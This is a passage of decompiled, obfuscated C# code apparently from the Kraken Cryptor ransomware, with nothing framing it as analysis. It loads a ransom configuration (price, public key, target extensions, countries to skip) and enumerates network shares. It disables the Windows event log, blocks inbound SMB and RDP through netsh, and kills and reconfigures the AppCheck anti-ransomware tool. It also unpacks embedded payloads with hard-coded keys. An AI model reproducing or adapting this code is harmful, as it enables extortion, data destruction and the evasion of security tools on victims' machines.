		IntPtr intptr_ = IntPtr.Zero;
		try
		{
			*(int*)((byte*)ptr + 16) = Class16.NetShareEnum(string_0, *(int*)ptr, out intptr_, -1, out *(int*)((byte*)ptr + 8), out *(int*)((byte*)ptr + 12), ref *(int*)((byte*)ptr + 4));
			if (5 == *(int*)((byte*)ptr + 16))
			{
				*(int*)ptr = 1;
				*(int*)((byte*)ptr + 16) = Class16.NetShareEnum(string_0, *(int*)ptr, out intptr_, -1, out *(int*)((byte*)ptr + 8), out *(int*)((byte*)ptr + 12), ref *(int*)((byte*)ptr + 4));
			}
			if (*(int*)((byte*)ptr + 16) != 0 || *(int*)((byte*)ptr + 8) <= 0)
			{
				return;
			}
			Type type = ((2 == *(int*)ptr) ? typeof(Class3.Struct0) : typeof(Class3.Struct1));
			*(int*)((byte*)ptr + 20) = Marshal.SizeOf(type);
			*(int*)((byte*)ptr + 24) = 0;
			*(int*)((byte*)ptr + 28) = intptr_.ToInt32();
			while (*(int*)((byte*)ptr + 24) < *(int*)((byte*)ptr + 8))
			{
				IntPtr ptr2 = new IntPtr(*(int*)((byte*)ptr + 28));
				if (1 == *(int*)ptr)
				{
					Class3.Struct1 @struct = (Class3.Struct1)Marshal.PtrToStructure(ptr2, type);
					class3_0.method_0(@struct.string_0, string.Empty, @struct.enum0_0, @struct.string_1);
				}
				else
				{
					Class3.Struct0 struct2 = (Class3.Struct0)Marshal.PtrToStructure(ptr2, type);
					class3_0.method_0(struct2.string_0, struct2.string_2, struct2.enum0_0, struct2.string_1);
				}
				(*(int*)((byte*)ptr + 24))++;
				*(int*)((byte*)ptr + 28) += *(int*)((byte*)ptr + 20);
			}
		}
		finally
		{
			if (IntPtr.Zero != intptr_)
			{
				Class16.NetApiBufferFree(intptr_);
			}
		}
	}

	unsafe static bool smethod_92()
	{
		void* ptr = stackalloc byte[10];
		try
		{
			JsonNode jsonNode = Class16.smethod_97(Encoding.UTF8.GetString(Class16.smethod_62()));
			Class4.Class5.smethod_0(Class16.smethod_65(jsonNode["project"]["name"]));
			Class4.Class5.smethod_2(Class16.smethod_0(jsonNode["project"]["version"]));
			Class4.Class5.smethod_3(Class16.smethod_65(jsonNode["project"]["comment"]));
			Class4.Class5.smethod_5(Class16.smethod_41(jsonNode["module"]["anti_forensic"]));
			Class4.Class5.smethod_7(Class16.smethod_41(jsonNode["module"]["anti_revere"]));
			Class4.Class5.smethod_9(Class16.smethod_41(jsonNode["module"]["anti_virtual"]));
			Class4.Class5.smethod_13(Class16.smethod_41(jsonNode["module"]["anti_smb"]));
			Class4.Class5.smethod_11(Class16.smethod_41(jsonNode["module"]["anti_rdp"]));
			Class4.Class5.smethod_15(Class16.smethod_41(jsonNode["module"]["country_check"]));
			Class4.Class5.smethod_17(Class16.smethod_41(jsonNode["module"]["keyboard_check"]));
			Class4.Class5.smethod_19(Class16.smethod_41(jsonNode["module"]["registry_check"]));
			Class4.Class5.smethod_21(Class16.smethod_41(jsonNode["module"]["fix_device"]));
			Class4.Class5.smethod_23(Class16.smethod_41(jsonNode["module"]["network_device"]));
			Class4.Class5.smethod_25(Class16.smethod_41(jsonNode["module"]["flash_device"]));
			Class4.Class5.smethod_27(Class16.smethod_41(jsonNode["module"]["extension_bypass"]));
			Class4.Class5.smethod_29(Class16.smethod_41(jsonNode["module"]["rapid_mode"]));
			Class4.Class5.smethod_31(Class16.smethod_65(jsonNode["core"]["support_email_1"]));
			Class4.Class5.smethod_33(Class16.smethod_65(jsonNode["core"]["support_email_2"]));
			Class4.Class5.smethod_35(Class16.smethod_85(jsonNode["core"]["price"]));
			Class4.Class5.smethod_37(Class16.smethod_65(jsonNode["core"]["price_unit"]));
			Class4.Class5.smethod_39(Class16.smethod_65(jsonNode["core"]["public_key"]));
			Class4.Class5.smethod_41(Class16.smethod_65(jsonNode["core"]["new_extension"]));
			Class4.Class5.smethod_43(Class16.smethod_0(jsonNode["core"]["main_cipher_key_size"]));
			Class4.Class5.smethod_45(Class16.smethod_0(jsonNode["core"]["session_cipher_key_size"]));
			Class4.Class5.smethod_47(Class16.smethod_0(jsonNode["core"]["aes_cipher_key_size"]));
			Class4.Class5.smethod_49(Class16.smethod_7(Class16.smethod_59(jsonNode["core"]["target_extensions"])));
			Class4.Class5.smethod_61(Class16.smethod_0(jsonNode["core"]["delay_sec"]));
			Class4.Class5.smethod_51(Class16.smethod_7(Class16.smethod_59(jsonNode["core"]["countries"])));
			Class4.Class5.smethod_53(Class16.smethod_7(Class16.smethod_59(jsonNode["core"]["languages"])));
			Class4.Class5.smethod_55(Class16.smethod_7(Class16.smethod_59(jsonNode["core"]["skip_files"])));
			Class4.Class5.smethod_57(Class16.smethod_7(Class16.smethod_59(jsonNode["core"]["skip_directories"])));
			Class4.Class5.smethod_59(Class16.smethod_7(Class16.smethod_59(jsonNode["core"]["process_stop"])));
			Class4.Class5.smethod_63(Class16.smethod_65(jsonNode["core"]["help_file"]["name"]));
			Class4.Class5.smethod_65(Class16.smethod_65(jsonNode["core"]["help_file"]["extension"]));
			Class4.Class5.smethod_67(Class16.smethod_65(jsonNode["core"]["help_file"]["body"]));
			Thread.Sleep(Class4.Class5.smethod_60() * 1000);
			if (Class4.Class5.smethod_8() && Class16.smethod_37())
			{
				((byte*)ptr)[9] = 0;
			}
			else if (Class4.Class5.smethod_6() && Class16.smethod_38())
			{
				((byte*)ptr)[9] = 0;
			}
			else if (!Class16.smethod_45())
			{
				((byte*)ptr)[9] = 0;
			}
			else
			{
				if (Class4.Class5.smethod_16())
				{
					string text = Class16.smethod_75();
					if (text != null)
					{
						if (text.Contains(","))
						{
							string[] array = text.Split(new char[1] { ',' });
							*(int*)ptr = 0;
							while (*(int*)ptr < array.Length)
							{
								string text2 = array[*(int*)ptr];
								string[] array2 = Class4.Class5.smethod_52();
								*(int*)((byte*)ptr + 4) = 0;
								while (true)
								{
									if (*(int*)((byte*)ptr + 4) >= array2.Length)
									{
										(*(int*)ptr)++;
										break;
									}
									if (!(array2[*(int*)((byte*)ptr + 4)] == text2))
									{
										(*(int*)((byte*)ptr + 4))++;
										continue;
									}
									((byte*)ptr)[9] = 0;
									goto end_IL_0006;
								}
							}
						}
						else
						{
							string[] array = Class4.Class5.smethod_52();
							*(int*)ptr = 0;
							while (*(int*)ptr < array.Length)
							{
								if (!(array[*(int*)ptr] == text))
								{
									(*(int*)ptr)++;
									continue;
								}
								((byte*)ptr)[9] = 0;
								goto end_IL_0006;
							}
						}
					}
				}
				if (!(Class6.Class7.smethod_14() == "UNKNOWN") && Class4.Class5.smethod_14())
				{
					string[] array = Class4.Class5.smethod_50();
					*(int*)ptr = 0;
					while (*(int*)ptr < array.Length)
					{
						string text3 = array[*(int*)ptr];
						if (!(Class6.Class7.smethod_14().ToUpper() == text3.ToUpper()))
						{
							(*(int*)ptr)++;
							continue;
						}
						((byte*)ptr)[9] = 0;
						goto end_IL_0006;
					}
				}
				if (!Class4.Class5.smethod_18() || Class16.smethod_36())
				{
					if (Class4.Class5.smethod_4())
					{
						Class16.smethod_83("cmd.exe", "/C sc config eventlog start=disabled");
						Class16.smethod_83("cmd.exe", "/C REG add \"HKLM\\SYSTEM\\CurrentControlSet\\services\\eventlog\" / v Start / t REG_DWORD / d 4 / f");
					}
					if (Class4.Class5.smethod_12())
					{
						Class16.smethod_83("cmd.exe", "/C NetSh Advfirewall set allprofiles state on");
						Class16.smethod_83("cmd.exe", "/C netsh advfirewall firewall add rule name=\"SMB Protocol Block\" protocol=TCP dir=in localport=445 action=block");
					}
					if (Class4.Class5.smethod_10())
					{
						Class16.smethod_83("cmd.exe", "/C NetSh Advfirewall set allprofiles state on");
						Class16.smethod_83("cmd.exe", "/C netsh advfirewall firewall add rule name=\"RDP Protocol Block\" protocol=TCP dir=in localport=3389 action=block");
					}
					Class16.smethod_35(Class4.Class5.smethod_58());
					if (Class16.smethod_6("appcheck"))
					{
						Class16.smethod_83("cmd.exe", "/C reg add \"HKLM\\SOFTWARE\\CheckMAL\\AppCheck\" /v ProductVersion /t REG_SZ /d \"Please contact with \"Kraken Cryptor\" support for decrypt your files.\" /f");
						Class16.smethod_83("cmd.exe", "/C reg add \"HKLM\\SOFTWARE\\CheckMAL\\AppCheck\" /v RansomBackupExt/t REG_SZ /d \"NULL\" /f");
						Class16.smethod_83("cmd.exe", "/C reg add \"HKLM\\SOFTWARE\\CheckMAL\\AppCheck\" /v Options /t REG_DWORD /d 0 /f");
						Class16.smethod_83("cmd.exe", "/C taskkill /F /IM appcheck.exe");
					}
					((byte*)ptr)[8] = 1;
					goto IL_06f0;
				}
				((byte*)ptr)[9] = 0;
			}
			end_IL_0006:;
		}
		catch (Exception)
		{
			((byte*)ptr)[8] = 0;
			goto IL_06f0;
		}
		return ((byte*)ptr)[9] != 0;
		IL_06f0:
		return ((byte*)ptr)[8] != 0;
	}

	static int smethod_93(Class19.Class21 class21_0, int int_0)
	{
		if (class21_0.int_2 < int_0)
		{
			if (class21_0.int_0 == class21_0.int_1)
			{
				return -1;
			}
			class21_0.uint_0 |= (uint)(((class21_0.byte_0[class21_0.int_0++] & 0xFF) | ((class21_0.byte_0[class21_0.int_0++] & 0xFF) << 8)) << class21_0.int_2);
			class21_0.int_2 += 16;
		}
		return (int)(class21_0.uint_0 & ((1 << int_0) - 1));
	}

	unsafe static byte[] smethod_94(byte[] byte_0)
	{
		void* ptr = stackalloc byte[46];
		Assembly callingAssembly = Assembly.GetCallingAssembly();
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		if ((object)callingAssembly != executingAssembly && !Class16.smethod_64(callingAssembly, executingAssembly))
		{
			return null;
		}
		Class19.Stream0 stream = new Class19.Stream0(byte_0);
		byte[] array = new byte[0];
		*(int*)ptr = Class16.smethod_73(stream);
		if (*(int*)ptr == 67324752)
		{
			*(short*)((byte*)ptr + 44) = (short)Class16.smethod_56(stream);
			*(int*)((byte*)ptr + 4) = Class16.smethod_56(stream);
			*(int*)((byte*)ptr + 8) = Class16.smethod_56(stream);
			if (*(int*)ptr != 67324752 || *(short*)((byte*)ptr + 44) != 20 || *(int*)((byte*)ptr + 4) != 0 || *(int*)((byte*)ptr + 8) != 8)
			{
				throw new FormatException("Wrong Header Signature");
			}
			Class16.smethod_73(stream);
			Class16.smethod_73(stream);
			Class16.smethod_73(stream);
			*(int*)((byte*)ptr + 12) = Class16.smethod_73(stream);
			*(int*)((byte*)ptr + 16) = Class16.smethod_56(stream);
			*(int*)((byte*)ptr + 20) = Class16.smethod_56(stream);
			if (*(int*)((byte*)ptr + 16) > 0)
			{
				byte[] buffer = new byte[*(int*)((byte*)ptr + 16)];
				stream.Read(buffer, 0, *(int*)((byte*)ptr + 16));
			}
			if (*(int*)((byte*)ptr + 20) > 0)
			{
				byte[] buffer2 = new byte[*(int*)((byte*)ptr + 20)];
				stream.Read(buffer2, 0, *(int*)((byte*)ptr + 20));
			}
			byte[] array2 = new byte[stream.Length - stream.Position];
			stream.Read(array2, 0, array2.Length);
			Class19.Class20 @class = new Class19.Class20(array2);
			array = new byte[*(int*)((byte*)ptr + 12)];
			Class19.Class20 class20_ = @class;
			byte[] byte_ = array;
			*(int*)((byte*)ptr + 40) = array.Length;
			Class16.smethod_86(byte_, *(int*)((byte*)ptr + 40), 0, class20_);
			array2 = null;
		}
		else
		{
			*(int*)((byte*)ptr + 24) = *(int*)ptr >> 24;
			*(int*)ptr -= *(int*)((byte*)ptr + 24) << 24;
			if (*(int*)ptr != 8223355)
			{
				throw new FormatException("Unknown Header");
			}
			if (*(int*)((byte*)ptr + 24) == 1)
			{
				*(int*)((byte*)ptr + 28) = Class16.smethod_73(stream);
				array = new byte[*(int*)((byte*)ptr + 28)];
				*(int*)((byte*)ptr + 32) = 0;
				while (*(int*)((byte*)ptr + 32) < *(int*)((byte*)ptr + 28))
				{
					int num = Class16.smethod_73(stream);
					*(int*)((byte*)ptr + 36) = Class16.smethod_73(stream);
					byte[] array3 = new byte[num];
					stream.Read(array3, 0, array3.Length);
					Class16.smethod_86(array, *(int*)((byte*)ptr + 36), *(int*)((byte*)ptr + 32), new Class19.Class20(array3));
					*(int*)((byte*)ptr + 32) += *(int*)((byte*)ptr + 36);
				}
			}
			if (*(int*)((byte*)ptr + 24) == 2)
			{
				byte[] byte_2 = new byte[8] { 236, 53, 94, 163, 89, 110, 251, 27 };
				byte[] byte_3 = new byte[8] { 203, 120, 60, 208, 160, 5, 146, 135 };
				using ICryptoTransform cryptoTransform = Class16.smethod_9(byte_3, byte_2, bool_0: true);
				array = Class16.smethod_94(cryptoTransform.TransformFinalBlock(byte_0, 4, byte_0.Length - 4));
			}
			if (*(int*)((byte*)ptr + 24) == 3)
			{
				byte[] byte_4 = new byte[16]
				{
					1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
					1, 1, 1, 1, 1, 1
				};
				byte[] byte_5 = new byte[16]
				{
					2, 2, 2, 2, 2, 2, 2, 2, 2, 2,
					2, 2, 2, 2, 2, 2
				};
				using ICryptoTransform cryptoTransform2 = Class16.smethod_66(byte_5, byte_4, bool_0: true);
				array = Class16.smethod_94(cryptoTransform2.TransformFinalBlock(byte_0, 4, byte_0.Length - 4));
			}
		}
		stream.Close();
		stream = null;
		return array;
	}

	unsafe static bool smethod_95(Class19.Class24 class24_0, Class19.Class21 class21_0)
	{
		void* ptr = stackalloc byte[12];
		while (true)
		{
			*(int*)ptr = class24_0.int_2;
			switch (*(int*)ptr)
			{
			case 5:
			{
				*(int*)((byte*)ptr + 8) = Class19.Class24.int_1[class24_0.int_7];
				int num = Class16.smethod_93(class21_0, *(int*)((byte*)ptr + 8));
				if (num >= 0)
				{
					Class16.smethod_96(class21_0, *(int*)((byte*)ptr + 8));
					num += Class19.Class24.int_0[class24_0.int_7];
					while (num-- > 0)
					{
						byte[] byte_ = class24_0.byte_1;
						*(int*)ptr = class24_0.int_8;
						class24_0.int_8 = *(int*)ptr + 1;
						byte_[*(int*)ptr] = class24_0.byte_2;
					}
					if (class24_0.int_8 == class24_0.int_6)
					{
						return true;
					}
					goto IL_0084;
				}
				return false;
			}
			case 4:
			{
				int num2;
				while (((num2 = Class16.smethod_100(class24_0.class23_0, class21_0)) & -16) == 0)
				{
					byte[] byte_2 = class24_0.byte_1;
					*(int*)ptr = class24_0.int_8;
					class24_0.int_8 = *(int*)ptr + 1;
					byte_2[*(int*)ptr] = (class24_0.byte_2 = (byte)num2);
					if (class24_0.int_8 == class24_0.int_6)
					{
						return true;
					}
				}
				if (num2 >= 0)
				{
					if (num2 >= 17)
					{
						class24_0.byte_2 = 0;
					}
					class24_0.int_7 = num2 - 16;
					class24_0.int_2 = 5;
					goto case 5;
				}
				return false;
			}
			case 3:
				while (class24_0.int_8 < class24_0.int_5)
				{
					*(int*)((byte*)ptr + 4) = Class16.smethod_93(class21_0, 3);
					if (*(int*)((byte*)ptr + 4) >= 0)
					{
						Class16.smethod_96(class21_0, 3);
						class24_0.byte_0[Class19.Class24.int_9[class24_0.int_8]] = (byte)(*(uint*)((byte*)ptr + 4));
						class24_0.int_8++;
						continue;
					}
					return false;
				}
				class24_0.class23_0 = new Class19.Class23(class24_0.byte_0);
				class24_0.byte_0 = null;
				class24_0.int_8 = 0;
				class24_0.int_2 = 4;
				goto case 4;
			case 2:
				class24_0.int_5 = Class16.smethod_93(class21_0, 4);
				if (class24_0.int_5 >= 0)
				{
					class24_0.int_5 += 4;
					Class16.smethod_96(class21_0, 4);
					class24_0.byte_0 = new byte[19];
					class24_0.int_8 = 0;
					class24_0.int_2 = 3;
					goto case 3;
				}
				return false;
			case 1:
				class24_0.int_4 = Class16.smethod_93(class21_0, 5);
				if (class24_0.int_4 >= 0)
				{
					class24_0.int_4++;
					Class16.smethod_96(class21_0, 5);
					class24_0.int_6 = class24_0.int_3 + class24_0.int_4;
					class24_0.byte_1 = new byte[class24_0.int_6];
					class24_0.int_2 = 2;
					goto case 2;
				}
				return false;
			case 0:
				class24_0.int_3 = Class16.smethod_93(class21_0, 5);
				if (class24_0.int_3 >= 0)
				{
					class24_0.int_3 += 257;
					Class16.smethod_96(class21_0, 5);
					class24_0.int_2 = 1;
					goto case 1;
				}
				return false;
			}
			continue;
			IL_0084:
			class24_0.int_2 = 4;
		}
	}

	static void smethod_96(Class19.Class21 class21_0, int int_0)
	{
		class21_0.uint_0 >>= int_0;
		class21_0.int_2 -= int_0;
	}

	static JsonNode smethod_97(string string_0)
	{
		return JsonNode.smethod_0(Class16.smethod_60(string_0));
	}

	static bool smethod_98(Class2 class2_0, string string_0)
	{
		if (!Class16.smethod_48(class2_0))
		{
			return false;
		}
		if (string.IsNullOrEmpty(string_0))
		{
			return true;
		}
		return string_0.ToLower().StartsWith(class2_0.method_2().ToLower());
	}

	unsafe static string smethod_99(string string_0)
	{
		void* ptr = stackalloc byte[5];
		StringBuilder stringBuilder = new StringBuilder();
		*(int*)ptr = 0;
		while (*(int*)ptr < string_0.Length)
		{
			char c = string_0[*(int*)ptr];
			switch (c)
			{
			case '"':
				stringBuilder.Append("\\\"");
				break;
			case '\b':
				stringBuilder.Append("\\b");
				break;
			case '\t':
				stringBuilder.Append("\\t");
				break;
			case '\n':
				stringBuilder.Append("\\n");
				break;
			case '\f':
				stringBuilder.Append("\\f");
				break;
			case '\r':
				stringBuilder.Append("\\r");
				break;
			case '\\':
				stringBuilder.Append("\\\\");
				break;
			default:
				if (c < ' ')
				{
					((byte*)ptr)[4] = Convert.ToByte(c);
					stringBuilder.Append("\\u00" + ((byte*)ptr)[4].ToString("x2").ToUpper());
				}
				else
				{
					stringBuilder.Append(c);
				}
				break;
			case '/':
				stringBuilder.Append(c);
				break;
			}
			(*(int*)ptr)++;
		}
		return stringBuilder.ToString();
	}

	unsafe static int smethod_100(Class19.Class23 class23_0, Class19.Class21 class21_0)
	{
		void* ptr = stackalloc byte[16];
		int num;
		int num2;
		if ((num = Class16.smethod_93(class21_0, 9)) >= 0)
		{
			if ((num2 = class23_0.short_0[num]) >= 0)
			{
				Class16.smethod_96(class21_0, num2 & 0xF);
				return num2 >> 4;
			}
			*(int*)ptr = -(num2 >> 4);
			*(int*)((byte*)ptr + 4) = num2 & 0xF;
			if ((num = Class16.smethod_93(class21_0, *(int*)((byte*)ptr + 4))) >= 0)
			{
				num2 = class23_0.short_0[*(int*)ptr | (num >> 9)];
				Class16.smethod_96(class21_0, num2 & 0xF);
				return num2 >> 4;
			}
			*(int*)((byte*)ptr + 8) = class21_0.int_2;
			num = Class16.smethod_93(class21_0, *(int*)((byte*)ptr + 8));
			num2 = class23_0.short_0[*(int*)ptr | (num >> 9)];
			if ((num2 & 0xF) <= *(int*)((byte*)ptr + 8))
			{
				Class16.smethod_96(class21_0, num2 & 0xF);
				return num2 >> 4;
			}
			return -1;
		}
		*(int*)((byte*)ptr + 12) = class21_0.int_2;
		num = Class16.smethod_93(class21_0, *(int*)((byte*)ptr + 12));
		num2 = class23_0.short_0[num];
		if (num2 >= 0 && (num2 & 0xF) <= *(int*)((byte*)ptr + 12))
		{
			Class16.smethod_96(class21_0, num2 & 0xF);
			return num2 >> 4;
		}
		return -1;
	}
}
